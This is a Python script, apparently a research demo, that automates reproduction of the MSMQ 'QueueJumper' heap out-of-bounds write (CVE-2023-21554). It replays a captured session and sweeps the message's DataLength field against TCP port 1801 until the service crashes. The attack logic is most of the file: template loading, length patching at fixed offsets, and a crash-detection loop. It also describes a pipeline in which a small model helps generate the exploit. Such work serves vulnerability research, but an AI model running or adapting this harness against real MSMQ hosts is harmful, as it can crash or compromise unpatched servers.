#!/usr/bin/env python3
"""
Scuffle, end to end: a stack trace IN, a reproducing proof of concept OUT.

This is the public, self-contained orchestrator for the MSMQ "QueueJumper" worked
example (CVE-2023-21554, a patched Microsoft heap out-of-bounds write). It walks the
five stages on a single trace and drives the reproduction against a LOCAL, isolated,
deliberately down-level MSMQ. The live crash is the only success signal.

    python scuffle.py

Prereqs (Windows, Administrator), see setup/ and the demo README:
  1. python setup/fetch_vuln_mqqm.py mqqm_vuln.dll
  2. powershell -ExecutionPolicy Bypass -File setup/install_and_swap.ps1 -VulnDll mqqm_vuln.dll

Nothing here is a novel exploit: the CVE is long patched and widely documented. The
point is the *procedure*, a crash screenshot reasoned into a reproduction, not the bug.
"""
import os, sys, struct, socket, subprocess, time

HERE = os.path.dirname(os.path.abspath(__file__))
KB = os.path.join(HERE, "kb", "msmq")

# ---------------------------------------------------------------- INPUT
# The certificate: the stack trace, as read from the screenshot. Everything below is
# reasoned from these four fields. (An OCR front end turns the image into this text;
# here we take the text directly.)
TRACE = {"process": "mqsvc.exe", "module": "mqqm.dll",
         "function": "CQmPacket::CQmPacket", "exception": "0xC0000005"}

# ---------------------------------------------------------------- STAGE 3 knowledge
# RETRIEVE: world knowledge a small model does not carry, kept in a small, auditable
# knowledge base keyed by the crashing module. Wire format + where the length lives.
KB_INDEX = {
    "mqqm.dll": {
        "component": "MSMQ", "transport": "TCP/1801",
        "session": ["establish_connection.bin", "connection_parameters.bin"],
        "template": "user_message.bin",
        "length_field_offsets": [0xF4, 0xF8],   # SRMP DataLength in this message
    }
}


def mqsvc_pid():
    """The oracle's eye: the running service PID (None if down). Windows-only."""
    try:
        out = subprocess.run(["tasklist", "/fi", "imagename eq mqsvc.exe", "/fo", "csv", "/nh"],
                             capture_output=True, text=True).stdout
        for line in out.splitlines():
            if "mqsvc.exe" in line.lower():
                return line.split(",")[1].strip().strip('"')
    except Exception:
        pass
    return None


def construct_and_fire(length_value, host="127.0.0.1", port=1801):
    """STAGE 5 (construct + verify one candidate): patch the length field into the
    message template, send the 3-frame session to the LOCAL service, watch the PID."""
    kb = KB_INDEX[TRACE["module"]]
    ec = open(os.path.join(KB, kb["session"][0]), "rb").read()
    cp = open(os.path.join(KB, kb["session"][1]), "rb").read()
    um = bytearray(open(os.path.join(KB, kb["template"]), "rb").read())
    for off in kb["length_field_offsets"]:
        struct.pack_into("<I", um, off, length_value & 0xFFFFFFFF)

    p0 = mqsvc_pid()
    try:
        s = socket.socket(); s.settimeout(8); s.connect((host, port))
        for frame in (ec, cp, bytes(um)):        # the crash needs the full session, not one packet
            s.send(frame); time.sleep(0.3)
            try:
                s.setblocking(False); s.recv(1024)
            except Exception:
                pass
            s.setblocking(True)
        s.close()
    except Exception:
        pass
    time.sleep(4)
    p1 = mqsvc_pid()
    return p0, p1, (p1 is None or p1 != p0)


def value_candidates():
    """STAGE 4 VALUE: the trigger regime. In the full system a small model proposes
    candidates and, if it misses, a deterministic solver reads the size formula from
    the binary (size = k*(sign_extend(len)+c)) and sweeps the positive 32-bit band
    where the allocation is large but succeeds, so the out-of-bounds write faults.
    The model is never trusted with the arithmetic. Here we sweep that band."""
    top, step = 0x7FFFFFFF, 0x08000000
    return list(range(step, top, step))


def main():
    print("=" * 68)
    print("SCUFFLE  |  stack trace IN  ->  reproducing PoC OUT")
    print("=" * 68)
    print(f"\n[INPUT]      {TRACE['process']}  {TRACE['module']}!{TRACE['function']}  {TRACE['exception']}")
    print(f"             (as read from the posted screenshot)")

    # STAGE 1 LOCALIZE (deterministic): the trace already names the crashing function;
    # the full system symbolicates the shipped mqqm.dll to pull its code for stage 2.
    print(f"\n[1 LOCALIZE] crashing function: {TRACE['function']}  (from the trace)")

    # STAGE 2 UNDERSTAND (small model): reads the bug class from the crashing code.
    # For this worked example the class is a heap out-of-bounds write driven by a
    # length field, which is what stages 3-4 act on.
    print(f"[2 UNDERSTAND] bug class: heap out-of-bounds write, length-field driven")

    # STAGE 3 RETRIEVE (knowledge base)
    kb = KB_INDEX[TRACE["module"]]
    print(f"[3 RETRIEVE] {kb['component']} over {kb['transport']}; message template + "
          f"length field @ {[hex(o) for o in kb['length_field_offsets']]}; "
          f"{len(kb['session'])} session frames")

    # STAGE 4 VALUE
    cands = value_candidates()
    print(f"[4 VALUE]    sweeping the overflow band: {len(cands)} candidates "
          f"({hex(cands[0])} .. {hex(cands[-1])})")

    # STAGE 5 VERIFY (live oracle disposes)
    print(f"[5 VERIFY]   firing at live {kb['component']} on 127.0.0.1:1801 (oracle = ground truth)\n")
    if mqsvc_pid() is None:
        print("   ! mqsvc is not running. Run setup/install_and_swap.ps1 first (Windows, Admin).")
        sys.exit(2)

    winner = None
    for c in cands:
        p0, p1, crashed = construct_and_fire(c)
        print(f"   length={hex(c):>12}  mqsvc {p0} -> {p1 or 'DOWN'}   "
              f"{'*** CRASH ***' if crashed else 'alive'}")
        if crashed:
            winner = c
            break

    print("\n" + "=" * 68)
    if winner is not None:
        print(f"RESULT: REPRODUCED. A screenshot of a stack trace became a PoC that")
        print(f"        crashes {kb['component']} with DataLength = {hex(winner)}.")
    else:
        print("RESULT: no crash from this band. Confirm the vulnerable mqqm.dll is loaded")
        print("        (setup/install_and_swap.ps1) and that mqsvc listens on TCP 1801.")
    print("=" * 68)


if __name__ == "__main__":
    main()
